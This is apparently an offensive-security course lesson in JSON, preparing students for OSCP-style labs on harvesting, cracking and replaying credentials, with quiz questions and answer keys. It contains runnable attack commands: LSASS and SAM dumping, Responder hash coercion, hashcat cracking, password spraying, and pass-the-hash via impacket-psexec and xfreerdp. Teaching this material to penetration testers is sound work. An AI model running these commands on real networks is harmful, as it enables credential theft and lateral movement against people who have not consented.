{
  "lesson_id": "4c282594-95a4-49cf-b69c-bdd8f0ba8373",
  "domain": "pentest",
  "title": "Password Attacks and Credential Operations",
  "subtitle": "Harvesting, cracking, and replaying credentials in PWK scenarios",
  "difficulty": 2,
  "estimated_time": 70,
  "order_index": 27,
  "author": "CyberLearn Offensive Curriculum Team",
  "base_xp_reward": 180,
  "mastery_threshold": 78,
  "is_core_concept": true,
  "created_at": "2025-01-20T12:00:00",
  "updated_at": "2025-01-20T12:00:00",
  "version": "1.0",
  "prerequisites": [
    "Passive OSINT Target Profiling",
    "Service Enumeration Playbooks"
  ],
  "concepts": [
    "Credential collection",
    "Password cracking workflows",
    "Wordlist generation",
    "Pass-the-hash and pass-the-ticket",
    "Offline hash extraction",
    "Password spraying",
    "Credential reuse detection",
    "OPSEC for password attacks"
  ],
  "learning_objectives": [
    "Collect password material from network captures, services, and OS artifacts",
    "Design cracking strategies with tailored wordlists and rules",
    "Execute online attacks responsibly while avoiding account lockouts",
    "Replay hashes and tickets to pivot without cracking when possible",
    "Document remediation recommendations that strengthen credential hygiene"
  ],
  "jim_kwik_principles": [
    "Active recall",
    "Spaced repetition"
  ],
  "content_blocks": [
    {
      "block_id": "f5bd4267-9f4c-42ed-8120-27a50e31f15a",
      "type": "explanation",
      "title": "Credential Operations Overview",
      "content": {
        "text": "# Why Credentials Matter\n\nEvery PWK machine hides passwords or hashes that unlock further access. Effective pentesters treat credentials as an intelligence discipline: collect, process, exploit, and report. This lesson guides you through the full lifecycle from discovery to reporting without triggering alarms.\n\n## Objectives\n\n- Identify credential sources on Windows and Linux hosts.\n- Plan cracking sessions using Hashcat and John the Ripper.\n- Apply online techniques such as password spraying, RDP brute force, and Kerberos pre-auth capture carefully.\n- Reuse credentials with pass-the-hash and Kerberos delegation abuse.\n\nKeep a credential notebook with fields for source, format, cracking status, and pivot impact. The OSCP exam rewards structured reporting of every credential you weaponise."
      },
      "simplified_explanation": "Treat credentials like intelligence: collect, crack, replay, and document.",
      "memory_aids": [
        "Collect \u2192 Crack \u2192 Reuse"
      ],
      "real_world_connection": "Many breaches start with a single reused password; defenders scrutinise credential hygiene reports.",
      "reflection_prompt": "How are you currently tracking credentials between lab machines?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "a0b3f3b3-fc9d-4e17-b66c-eb4e327cc33d",
      "type": "explanation",
      "title": "Discovery Techniques",
      "content": {
        "text": "# Offline Sources\n\n- Windows SAM and SYSTEM hives: Use reg.exe or secretsdump.py once you have SYSTEM.\n- Linux /etc/shadow and SSH keys: copy carefully, maintain permissions for stealth.\n- Database connection strings: search configuration files (`grep -R \"password\" /var/www`).\n- Memory dumps: utilise procdump or comsvcs.dll MiniDumpW for lsass on Windows (respect OSCP tooling policies).\n\n## Network Capture\n\n- Responder and Inveigh to coerce NTLMv1/v2 challenges (allowed in PWK labs when rules permit).\n- Tcpdump or Wireshark to capture credentials sent in cleartext (FTP, Telnet).\n- Kerberos AS-REP roasting with impacket-GetNPUsers for users without pre-authentication.\n\n## OSINT Feeders\n\n- Corporate breach dumps from Have I Been Pwned, DeHashed.\n- Employee naming conventions to build custom wordlists.\n\nDocument timestamps, hostnames, and accounts to avoid duplication."
      },
      "simplified_explanation": "Harvest credentials from system files, memory, network captures, and OSINT.",
      "memory_aids": [
        "Host + Network + OSINT"
      ],
      "real_world_connection": "Real-world phishing engagements reuse OSINT wordlists to guess VPN passwords.",
      "reflection_prompt": "Which discovery source feels weakest in your workflow?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "2055273b-6fec-429b-b61a-a5205493129f",
      "type": "explanation",
      "title": "Cracking Strategy",
      "content": {
        "text": "# Hash Identification\n\nDetect hash formats using `hashid` or `hashcat --example-hashes`. For PWK you will commonly see:\n- NTLM (Windows)\n- MD5 / SHA1 (legacy web apps)\n- bcrypt (modern apps)\n- Kerberos etype 23 (AS-REP roast)\n\n## Wordlists and Rules\n\n- Start with `rockyou.txt`, but enrich with `cewl` output from target websites.\n- Use `hashcat -r` with rules like `best64.rule` to mutate base words.\n- Create targeted masks: `?u?l?l?l?l?d?d` for patterns like Winter23.\n\n## Distributed Cracking\n\n- For large sets, split tasks across GPU rigs or use Hashtopolis.\n- Monitor progress, adjust strategies when hit rate drops.\n\nAlways note cracking parameters to justify findings in your report."
      },
      "simplified_explanation": "Identify hash types, choose wordlists, apply rules, and log cracking settings.",
      "memory_aids": [
        "Format \u2192 Wordlist \u2192 Rule \u2192 Mask"
      ],
      "real_world_connection": "OSCP graders appreciate when you reference specific rules in your notes.",
      "reflection_prompt": "How quickly can you pivot from hash discovery to a tuned hashcat command?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "91a103ae-b83b-4ad2-8997-dd94091c4a2d",
      "type": "explanation",
      "title": "Online Attacks and OPSEC",
      "content": {
        "text": "# Password Spraying\n\nLimit attempts to avoid lockouts:\n- For AD: target a subset of users with one password per 30 minutes.\n- Use `crackmapexec` or `kerbrute` with throttle options.\n\n## Brute Force Considerations\n\n- Services like SSH, FTP, and RDP often enforce lockouts after 5 attempts. Track counters per user.\n- Use proxies or pivot hosts to distribute attempts, but monitor for account lock messages.\n\n## Kerberos and NTLM Replay\n\n- Pass-the-hash via `wmiexec.py -hashes` or `pth-winexe` when LM/NTLM available.\n- Pass-the-ticket by exporting Kerberos tickets with Mimikatz (`kerberos::ptt`).\n- Remote Desktop using `xfreerdp /pth` for NTLM hashes.\n\nMaintain audit logs noting attempts, results, and OPSEC precautions."
      },
      "simplified_explanation": "Throttle online attacks, use pass-the-hash/ticket when possible, and log your actions.",
      "memory_aids": [
        "Spray slow, replay fast"
      ],
      "real_world_connection": "During 2023 assessments, careless spraying caused lockouts and failed engagements.",
      "reflection_prompt": "What guardrails will you enforce before launching a password spray?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "f42a1fa6-8200-4883-bad4-b74f697f0512",
      "type": "code_exercise",
      "title": "Hashcat Workflow",
      "content": {
        "text": "Practise cracking NTLM hashes using Hashcat:\n\n1. Create a file `ntlm.hash` containing `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`.\n2. Run `hashcat -m 1000 -a 0 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show`.\n3. Record cracked password `password1` and note runtime.\n4. Modify the list with a custom entry `Winter2025!` and re-run to simulate targeted cracking.\n\nCapture command, rule, and outcome in your lab journal."
      },
      "simplified_explanation": "Run hashcat with rockyou and rules to crack NTLM hashes.",
      "memory_aids": [],
      "real_world_connection": "Hashcat mastery shortens OSCP exam time dramatically.",
      "reflection_prompt": "Which parameters will you tweak first when a hash resists cracking?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "6874f7bc-e06a-440e-a453-14242f23cb43",
      "type": "code_exercise",
      "title": "Responder Capture Lab",
      "content": {
        "text": "Build muscle memory for coercing NTLM hashes:\n\n1. In PWK-style lab, launch Responder: `sudo responder -I tun0 -wrf`.\n2. Trigger authentication by browsing to `\\\\attacker\\share` from a victim machine or using `Invoke-Command` to map the share.\n3. Observe captured hashes in `/usr/share/responder/logs/`. Identify username, challenge, and hash.\n4. Use `hashcat -m 5600` to crack the captured NTLMv2 hash with a targeted wordlist.\n\nRemember to disable Responder after capture to avoid interfering with legitimate traffic."
      },
      "simplified_explanation": "Run Responder, coerce authentication, crack captured NTLM hashes.",
      "memory_aids": [],
      "real_world_connection": "Responder remains a staple in PWK labs and real engagements.",
      "reflection_prompt": "How will you avoid disrupting network services when running Responder?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "2ed26f91-48d0-4530-8088-2a036a424578",
      "type": "code_exercise",
      "title": "Pass-the-Hash Execution",
      "content": {
        "text": "Practise reusing NTLM hashes without cracking:\n\n```bash\nimpacket-psexec Administrator@10.10.11.5 -hashes ::8846f7eaee8fb117ad06bdd830b7586c\n```\n\n- Replace IP and hash with lab values.\n- If SMB signing blocks you, switch to `wmiexec.py` or `smbexec.py`.\n- Document differences in artifacts (event logs, process names).\n\nExtend exercise by using `xfreerdp /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /v:10.10.11.5` to obtain RDP access."
      },
      "simplified_explanation": "Reuse NTLM hashes directly via Impacket tools and RDP.",
      "memory_aids": [],
      "real_world_connection": "Pass-the-hash often unlocks domain admin without cracking.",
      "reflection_prompt": "What defender logs would reveal your pass-the-hash activity?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "edcff1fa-b4c5-4a47-b077-9ff08e4449c4",
      "type": "real_world",
      "title": "Case Study: Password Reuse Breach",
      "content": {
        "text": "In 2023, a healthcare provider suffered a breach when attackers reused an employee's leaked LinkedIn password to access VPN. Multi-factor authentication was offline during maintenance, so the attackers pivoted to internal Citrix and dumped LSASS memory to harvest dozens of credentials. Incident responders highlighted the lack of password rotation and monitoring of VPN logs.\n\n**Lesson:** Password reuse plus missing MFA equals rapid compromise. Your reports must emphasise layered defences."
      },
      "simplified_explanation": "Password reuse without MFA enabled a major breach.",
      "memory_aids": [
        "Reuse + no MFA = breach"
      ],
      "real_world_connection": "",
      "reflection_prompt": "How will you articulate the risk of password reuse to executive stakeholders?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "5f156691-08f1-4d8a-aac3-52fa9e79a1b0",
      "type": "memory_aid",
      "title": "Mnemonic: CRAFT",
      "content": {
        "text": "Remember CRAFT for credential operations:\n\n- **C**ollect from hosts, network, OSINT\n- **R**ecord source and format immediately\n- **A**ttack via cracking or online spraying\n- **F**orge replays (pass-the-hash/ticket)\n- **T**each defenders by documenting remediation\n\nReview CRAFT before each password-focused session."
      },
      "simplified_explanation": "CRAFT keeps credential workflows organised.",
      "memory_aids": [
        "Collect, Record, Attack, Forge, Teach"
      ],
      "real_world_connection": "",
      "reflection_prompt": "Which stage of CRAFT is easiest for you to neglect under time pressure?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "761bccb0-3eaa-43cc-84ef-d621bc178b8f",
      "type": "diagram",
      "title": "Credential Pipeline",
      "content": {
        "text": "```\nDiscovery --> Normalize --> Crack/Replay --> Pivot --> Report\n    |            |            |             |        |\n  OSINT      Hash ID     Hashcat rules   Pass-the-hash  Remediation\n  Host logs  Format      Mask attacks    Kerberos PTT   MFA rollout\n  Network    Notebook    GPU rigs        RDP / WinRM    Password policy\n```"
      },
      "simplified_explanation": "Visualise the flow from discovery to reporting.",
      "memory_aids": [
        "Pipeline ensures no credential is wasted."
      ],
      "real_world_connection": "",
      "reflection_prompt": "Where in this pipeline do you lose the most time today?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "62fc4b1a-0854-44af-bffd-993a04863b68",
      "type": "mindset_coach",
      "title": "Stay Ethical",
      "content": {
        "text": "Credential handling demands discipline. Every hash represents real trust. Treat captured credentials respectfully, limit storage, and label notes with destruction reminders. Ethical hackers build credibility by proving they can handle secrets responsibly."
      },
      "simplified_explanation": "Handle credentials with respect and clear retention plans.",
      "memory_aids": [
        "Stewardship builds trust."
      ],
      "real_world_connection": "Clients renew contracts with testers who demonstrate impeccable credential hygiene.",
      "reflection_prompt": "What is your retention policy for cracked passwords after an engagement?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "feb8495c-78c5-42a5-9e41-db47e4d437bf",
      "type": "reflection",
      "title": "Credential Ops Retro",
      "content": {
        "text": "After your next cracking session answer:\n\n- How many unique credentials did you collect and from which sources?\n- Which cracking techniques succeeded and why?\n- Did any online attempts trigger lockouts or alerts?\n- How did you pivot using replays and what artifacts remained?\n- What remediation advice will you include for each compromised account?\n\nConvert these answers into concise report snippets."
      },
      "simplified_explanation": "Review sources, cracking, online attempts, pivots, and remediation.",
      "memory_aids": [],
      "real_world_connection": "",
      "reflection_prompt": "Which question revealed a documentation gap in your workflow?",
      "is_interactive": false,
      "xp_reward": 0
    }
  ],
  "post_assessment": [
    {
      "question": "Which Hashcat mode should you use to crack NTLM hashes collected from a Windows SAM database?",
      "options": [
        "-m 0",
        "-m 5600",
        "-m 1000",
        "-m 13100"
      ],
      "correct_answer": 2,
      "explanation": "Mode 1000 targets NTLM hashes extracted from Windows systems.",
      "question_id": "646e203b-4d87-4509-a8b9-3362f95151f8",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "During a password spray you plan to test Winter2025! against 40 Active Directory accounts. What is the safest approach?",
      "options": [
        "Attempt the password against all accounts every minute until success",
        "Spray the password once against a subset of accounts, wait 30 minutes, then proceed",
        "Use Hydra to run 10 attempts per second across all accounts",
        "Run Responder simultaneously to increase success"
      ],
      "correct_answer": 1,
      "explanation": "Spacing attempts reduces lockout risk; targeting subsets respects AD account lock policies.",
      "question_id": "d814aae8-c163-4553-b36f-62e4c9caf657",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Why might you choose pass-the-hash over cracking an NTLM hash?",
      "options": [
        "Pass-the-hash reduces the need for network connectivity",
        "Pass-the-hash allows immediate reuse without GPU cracking time",
        "Pass-the-hash automatically resets the user password",
        "Pass-the-hash bypasses antivirus by default"
      ],
      "correct_answer": 1,
      "explanation": "Replaying hashes can grant access instantly without consuming time cracking complex passwords.",
      "question_id": "5c264acb-3a12-4436-ada1-7cc4219a34fc",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ]
}